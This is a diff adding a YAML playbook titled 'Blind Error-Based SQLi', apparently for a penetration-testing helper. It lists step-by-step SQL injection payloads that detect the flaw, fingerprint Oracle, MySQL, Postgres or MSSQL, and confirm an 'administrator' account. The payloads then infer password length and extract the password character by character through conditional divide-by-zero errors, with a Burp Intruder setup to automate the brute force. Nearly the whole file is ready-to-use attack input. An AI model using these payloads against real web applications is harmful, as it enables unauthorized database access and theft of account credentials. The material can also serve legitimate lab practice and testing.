@@ -1,0 +1,319 @@
+name: Blind Error-Based SQLi
+
+steps:
+
+# =========================================================
+# [1] DETECT ERROR BEHAVIOR
+# =========================================================
+- title: Detect Error Behavior
+  mode: chain
+  info: |
+    Identify whether malformed SQL triggers detectable errors.
+
+  entries:
+
+    - cmd: "'"
+      info: trigger syntax error
+
+    - cmd: "''"
+      info: fix broken quote
+
+    - cmd: "'--"
+      info: terminate query
+
+  look_for:
+    - HTTP 500
+    - verbose SQL errors
+    - changed response length
+    - missing page content
+    - redirects
+    - stack traces
+
+  notes:
+    - injectable locations may include:
+      - cookies
+      - GET params
+      - POST params
+      - headers
+    - compare valid vs invalid syntax behavior
+
+
+# =========================================================
+# [2] CONFIRM SQL CONTEXT
+# =========================================================
+- title: Confirm SQL Injection
+  mode: enum
+  info: |
+    Confirm the backend is processing SQL syntax.
+
+  entries:
+
+    - cmd: "'||(SELECT '')||'"
+      info: generic concatenation test
+
+    - cmd: "'||(SELECT '' FROM dual)||'"
+      info: oracle valid select
+
+    - cmd: "'||(SELECT '' FROM not_a_real_table)||'"
+      info: intentional invalid query
+
+  look_for:
+    - error disappears on valid syntax
+    - error returns on invalid query
+    - backend SQL processing confirmed
+
+  notes:
+    - Oracle requires:
+      - FROM dual
+    - invalid table names help confirm SQL execution
+
+
+# =========================================================
+# [3] DATABASE FINGERPRINTING
+# =========================================================
+- title: Fingerprint Database
+  mode: enum
+  info: |
+    Identify database type using syntax differences.
+
+  entries:
+
+    - cmd: "'||(SELECT '' FROM dual)||'"
+      info: oracle fingerprint
+
+    - cmd: "' AND @@version--"
+      info: mysql / mssql fingerprint
+
+    - cmd: "' AND version()--"
+      info: postgres fingerprint
+
+  look_for:
+    - oracle
+    - mysql
+    - postgres
+    - microsoft sql server
+
+  notes:
+    - syntax support often reveals DBMS
+    - fingerprinting helps choose extraction payloads
+
+
+# =========================================================
+# [4] CONDITIONAL ERRORS
+# =========================================================
+- title: Conditional Errors
+  mode: enum
+  info: |
+    Trigger errors conditionally to infer TRUE/FALSE.
+
+  entries:
+
+    - cmd: "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
+      info: oracle true condition
+
+    - cmd: "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
+      info: oracle false condition
+
+    - cmd: "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--"
+      info: postgres / mssql conditional error
+
+  look_for:
+    - errors only on TRUE
+    - HTTP 500 responses
+    - response differences
+
+  notes:
+    - divide-by-zero commonly used
+    - TRUE should trigger detectable behavior
+
+
+# =========================================================
+# [5] ENUMERATE TABLES
+# =========================================================
+- title: Enumerate Tables
+  mode: enum
+  info: |
+    Test whether interesting tables exist.
+
+  entries:
+
+    - cmd: "'||(SELECT '' FROM users WHERE ROWNUM=1)||'"
+      info: oracle users table check
+
+    - cmd: "' AND EXISTS(SELECT * FROM users)--"
+      info: generic existence check
+
+    - cmd: "'||(SELECT '' FROM administrators WHERE ROWNUM=1)||'"
+      info: alternate table name
+
+  look_for:
+    - no errors
+    - successful query execution
+    - changed responses
+
+  notes:
+    - ROWNUM=1 avoids multi-row issues
+    - test common table names first
+
+
+# =========================================================
+# [6] TEST USER EXISTS
+# =========================================================
+- title: Test User Exists
+  mode: enum
+  info: |
+    Confirm usernames exist using conditional logic.
+
+  entries:
+
+    - cmd: "'||(SELECT CASE WHEN username='administrator' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1)||'"
+      info: oracle username test
+
+    - cmd: "' AND EXISTS(SELECT * FROM users WHERE username='administrator')--"
+      info: generic existence test
+
+  look_for:
+    - triggered errors
+    - status code differences
+    - altered responses
+
+  notes:
+    - administrator is common target
+    - adapt for randomized usernames
+
+
+# =========================================================
+# [7] DETERMINE PASSWORD LENGTH
+# =========================================================
+- title: Determine Password Length
+  mode: chain
+  info: |
+    Infer password length using conditional errors.
+
+  entries:
+
+    - cmd: "'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+      info: test length > 1
+
+    - cmd: "'||(SELECT CASE WHEN LENGTH(password)>5 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+      info: test length > 5
+
+    - cmd: "'||(SELECT CASE WHEN LENGTH(password)>10 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+      info: test length > 10
+
+  look_for:
+    - error disappears at final length
+    - TRUE/FALSE behavior changes
+
+  notes:
+    - binary search can speed up enumeration
+    - continue until condition becomes false
+
+
+# =========================================================
+# [8] EXTRACT PASSWORD CHARACTERS
+# =========================================================
+- title: Extract Characters
+  mode: chain
+  info: |
+    Extract one character at a time from sensitive values.
+
+  entries:
+
+    - cmd: "'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+      info: first character
+
+    - cmd: "'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+      info: second character
+
+    - cmd: "'||(SELECT CASE WHEN SUBSTR(password,3,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+      info: third character
+
+  look_for:
+    - HTTP 500 on correct character
+    - TRUE/FALSE response changes
+
+  notes:
+    - iterate:
+      - position
+      - charset
+    - common charset:
+      - a-z
+      - 0-9
+    - Burp Intruder is ideal here
+
+
+# =========================================================
+# [9] BURP INTRUDER WORKFLOW
+# =========================================================
+- title: Burp Intruder Workflow
+  mode: chain
+  info: |
+    Automate blind extraction using Intruder.
+
+  entries:
+
+    - cmd: "SUBSTR(password,1,1)='§a§'"
+      info: mark payload position
+
+    - cmd: "Payloads: a-z0-9"
+      info: brute-force charset
+
+    - cmd: "Grep Match: HTTP 500 / error string"
+      info: identify TRUE condition
+
+  look_for:
+    - response length differences
+    - status code changes
+    - error messages
+
+  notes:
+    - repeat for every character position
+    - use cluster bomb carefully
+    - sniper mode usually sufficient
+
+
+# =========================================================
+# [10] FULL BLIND ERROR WORKFLOW
+# =========================================================
+- title: Full Blind Error Workflow
+  mode: chain
+  info: |
+    Example methodology for blind error-based SQL injection.
+
+  entries:
+
+    - cmd: "'"
+      info: detect syntax error
+
+    - cmd: "'||(SELECT '' FROM dual)||'"
+      info: validate SQL syntax
+
+    - cmd: "'||(SELECT '' FROM users WHERE ROWNUM=1)||'"
+      info: verify users table
+
+    - cmd: "'||(SELECT CASE WHEN username='administrator' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1)||'"
+      info: verify administrator exists
+
+    - cmd: "'||(SELECT CASE WHEN LENGTH(password)>10 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+      info: determine password length
+
+    - cmd: "'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+      info: extract password characters
+
+  look_for:
+    - syntax differences
+    - conditional errors
+    - HTTP 500 responses
+    - inferred TRUE/FALSE conditions
+
+  notes:
+    - replace:
+      - table names
+      - usernames
+      - column names
+    - adapt syntax for:
+      - mysql
+      - postgres
+      - mssql
+      - oracle
